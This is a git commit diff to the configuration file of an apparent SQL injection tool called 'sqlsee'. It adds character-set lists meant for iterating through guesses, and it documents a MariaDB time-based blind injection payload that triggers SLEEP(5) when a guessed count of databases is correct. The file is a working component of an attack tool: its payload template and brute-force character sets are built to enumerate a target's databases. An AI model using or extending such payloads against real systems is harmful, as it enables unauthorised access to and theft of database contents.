dc68b73e1623c0d2f464174bcbdbb46c83d1e55d
G3N3RA710N-L0CU57 <m.jenkins.software@gmail.com>
2022-11-28 16:18:12 +0000

    added chars to config file

--- configuration.py
+++ configuration.py
@@ -1,6 +1,20 @@
 # Configuration for sqlsee
 from enum import Enum
 
-class MariaDB(Enum):
 
+class Characters(Enum):
+    """ Character sets for iteration """
+
+    LOWER_LETTER = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z']
+
+    UPPER_LETTER = ['A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z']
+
+    DIGITS = ['0','1','2','3','4','5','6','7','8','9']
+
+    CHARS = ['.',',','/','-','_','#','!','$','&','*']
+
+class MariaDB(Enum):
+    """ Queries for MariaDB """
+
+    # Query to find number of databases.
     DATABASE_NUM = '(SELECT * FROM (SELECT IF((SELECT COUNT(*) FROM INFORMATION_SCHEMA.SCHEMATA) = {},(SELECT SLEEP(5)),0))GDiu)'
